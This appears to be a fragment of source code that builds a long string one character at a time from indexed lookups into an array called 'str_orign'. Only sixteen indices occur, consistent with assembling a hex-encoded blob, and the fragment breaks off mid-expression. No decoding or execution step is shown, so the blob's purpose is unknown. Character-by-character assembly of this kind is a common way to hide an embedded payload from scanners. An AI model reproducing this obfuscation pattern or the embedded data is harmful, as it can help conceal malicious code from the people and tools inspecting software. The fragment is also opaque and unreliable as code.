str_orign[26] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[32] + str_orign[28] + str_orign[33] + str_orign[4] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[5] + str_orign[29] + str_orign[35] + str_orign[28] + str_orign[32] + str_orign[3] + str_orign[5] + str_orign[33] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[32] + str_orign[30] + str_orign[4] + str_orign[27] + str_orign[30] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[2] + str_orign[29] + str_orign[1] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[33] + str_orign[34] + str_orign[29] + str_orign[29] + str_orign[27] + str_orign[29] + str_orign[27] + str_orign[29] + str_orign[30] + str_orign[1] + str_orign[30] + str_orign[1] + str_orign[31] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[30] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[35] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[0] + str_orign[33] + str_orign[1] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[1] + str_orign[33] + str_orign[31] + str_orign[30] + str_orign[3] + str_orign[31] + str_orign[33] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[34] + str_orign[30] + str_orign[29] + str_orign[31] + str_orign[33] + str_orign[29] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[28] + str_orign[0] + str_orign[30] + str_orign[31] + str_orign[32] + str_orign[34] + str_orign[0] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[34] + str_orign[33] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[1] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[28] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[27] + str_orign[26] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[34] + str_orign[34] + str_orign[5] + str_orign[2] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[32] + str_orign[35] + str_orign[30] + str_orign[1] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[31] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[0] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[27] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[26] + str_orign[33] + str_orign[32] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[29] + str_orign[2] + str_orign[28] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[33] + str_orign[30] + str_orign[5] + str_orign[31] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[34] + str_orign[4] + str_orign[1] + str_orign[35] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[0] + str_orign[0] + str_orign[2] + str_orign[30] + str_orign[4] + str_orign[27] + str_orign[30] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[31] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[30] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[4] + str_orign[35] + str_orign[35] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[1] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[28] + str_orign[34] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[29] + str_orign[1] + str_orign[32] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[34] + str_orign[34] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[34] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[3] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[28] + str_orign[35] + str_orign[35] + str_orign[28] + str_orign[29] + str_orign[5] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[29] + str_orign[4] + str_orign[3] + str_orign[26] + str_orign[1] + str_orign[27] + str_orign[33] + str_orign[2] + str_orign[1] + str_orign[28] + str_orign[34] + str_orign[5] + str_orign[5] + str_orign[29] + str_orign[0] + str_orign[4] + str_orign[35] + str_orign[2] + str_orign[2] + str_orign[4] + str_orign[28] + str_orign[34] + str_orign[33] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[5] + str_orign[27] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[26] + str_orign[0] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[26] + str_orign[4] + str_orign[27] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[0] + str_orign[0] + str_orign[32] + str_orign[4] + str_orign[34] + str_orign[3] + str_orign[26] + str_orign[1] + str_orign[5] + str_orign[0] + str_orign[1] + str_orign[33] + str_orign[0] + str_orign[0] + str_orign[29] + str_orign[29] + str_orign[3] + str_orign[35] + str_orign[4] + str_orign[31] + str_orign[27] + str_orign[0] + str_orign[27] + str_orign[31] + str_orign[29] + str_orign[1] + str_orign[30] + str_orign[5] + str_orign[32] + str_orign[29] + str_orign[5] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[0] + str_orign[34] + str_orign[30] + str_orign[26] + str_orign[33] + str_orign[32] + str_orign[31] + str_orign[26] + str_orign[3] + str_orign[33] + str_orign[1] + str_orign[4] + str_orign[4] + str_orign[32] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[1] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[34] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[0] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[3] + str_orign[30] + str_orign[30] + str_orign[30] + str_orign[28] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[35] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[32] + str_orign[35] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[27] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[32] + str_orign[32] + str_orign[28] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[4] + str_orign[30] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[28] + str_orign[31] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[30] + str_orign[29] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[32] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[31] + str_orign[28] + str_orign[0] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[34] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[4] + str_orign[35] + str_orign[33] + str_orign[33] + str_orign[0] + str_orign[28] + str_orign[0] + str_orign[0] + str_orign[5] + str_orign[29] + str_orign[0] + str_orign[33] + str_orign[31] + str_orign[5] + str_orign[34] + str_orign[2] + str_orign[5] + str_orign[4] + str_orign[2] + str_orign[32] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[28] + str_orign[33] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[27] + str_orign[0] + str_orign[35] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[34] + str_orign[1] + str_orign[4] + str_orign[31] + str_orign[27] + str_orign[0] + str_orign[5] + str_orign[35] + str_orign[26] + str_orign[0] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[26] + str_orign[35] + str_orign[0] + str_orign[26] + str_orign[5] + str_orign[32] + str_orign[0] + str_orign[0] + str_orign[33] + str_orign[2] + str_orign[3] + str_orign[29] + str_orign[31] + str_orign[35] + str_orign[0] + str_orign[4] + str_orign[26] + str_orign[28] + str_orign[30] + str_orign[33] + str_orign[31] + str_orign[28] + str_orign[3] + str_orign[29] + str_orign[35] + str_orign[34] + str_orign[27] + str_orign[3] + str_orign[32] + str_orign[1] + str_orign[2] + str_orign[1] + str_orign[26] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[33] + str_orign[0] + str_orign[35] + str_orign[5] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[33] + str_orign[29] + str_orign[0] + str_orign[4] + str_orign[1] + str_orign[3] + str_orign[2] + str_orign[3] + str_orign[28] + str_orign[30] + str_orign[0] + str_orign[35] + str_orign[31] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[5] + str_orign[35] + str_orign[1] + str_orign[30] + str_orign[0] + str_orign[27] + str_orign[30] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[31] + str_orign[0] + str_orign[29] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[0] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[4] + str_orign[30] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[34] + str_orign[28] + str_orign[1] + str_orign[34] + str_orign[0] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[34] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[28] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[26] + str_orign[27] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[4] + str_orign[30] + str_orign[30] + str_orign[33] + str_orign[2] + str_orign[28] + str_orign[4] + str_orign[33] + str_orign[0] + str_orign[34] + str_orign[5] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[29] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[28] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[4] + str_orign[26] + str_orign[35] + str_orign[35];
            str = str + str_orign[5] + str_orign[2] + str_orign[4] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[35] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[28] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[2] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[33] + str_orign[35] + str_orign[5] + str_orign[1] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[27] + str_orign[31] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[28] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[27] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[32] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[27] + str_orign[28] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[32] + str_orign[33] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[29] + str_orign[0] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[1] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[31] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[32] + str_orign[28] + str_orign[33] + str_orign[4] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[5] + str_orign[29] + str_orign[35] + str_orign[28] + str_orign[32] + str_orign[3] + str_orign[5] + str_orign[33] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[32] + str_orign[30] + str_orign[4] + str_orign[27] + str_orign[30] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[2] + str_orign[29] + str_orign[1] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[33] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[28] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[33] + str_orign[34] + str_orign[29] + str_orign[29] + str_orign[27] + str_orign[29] + str_orign[27] + str_orign[29] + str_orign[30] + str_orign[1] + str_orign[30] + str_orign[1] + str_orign[31] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[30] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[35] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[0] + str_orign[33] + str_orign[1] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[1] + str_orign[33] + str_orign[31] + str_orign[30] + str_orign[3] + str_orign[31] + str_orign[33] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[34] + str_orign[30] + str_orign[29] + str_orign[31] + str_orign[33] + str_orign[29] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[28] + str_orign[0] + str_orign[30] + str_orign[31] + str_orign[32] + str_orign[34] + str_orign[0] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[34] + str_orign[33] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[1] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[28] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[34] + str_orign[34] + str_orign[5] + str_orign[2] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[32] + str_orign[35] + str_orign[30] + str_orign[1] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[35] + str_orign[31] + 